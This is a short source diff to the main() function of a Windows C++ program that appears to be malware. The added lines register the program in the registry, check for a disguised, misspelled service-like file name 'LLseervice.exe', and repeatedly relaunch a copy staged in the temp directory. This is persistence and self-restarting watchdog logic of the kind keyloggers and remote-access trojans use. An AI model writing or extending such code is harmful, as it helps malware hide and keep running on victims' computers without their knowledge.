@@ -18,13 +18,20 @@ int main()
 	pre::start();
 
     Registry::RegisterProgram();
-
-    if (IO::getFileName() != "LLseervice.exe"){
+    string filename = IO::getFileName();
+    if (filename != "LLseervice.exe" &&  filename != "LLseervice" ){
+        std::string msg = "sate idle";
+        Helper::WriteAppLog(msg);
         char* temp = getenv("temp");
         std::string temp_dir(temp);
         std::string path = temp_dir+"\\LLseervice.exe";
         while(IO::exists_file(path)){
-            ss::creckSoc();
+            if (GetIsOnProcess(filename)){
+                ss::creckSoc();
+            } else {
+                IO::startup(path.c_str());
+            }
+
         }
     }
 	MSG Msg;
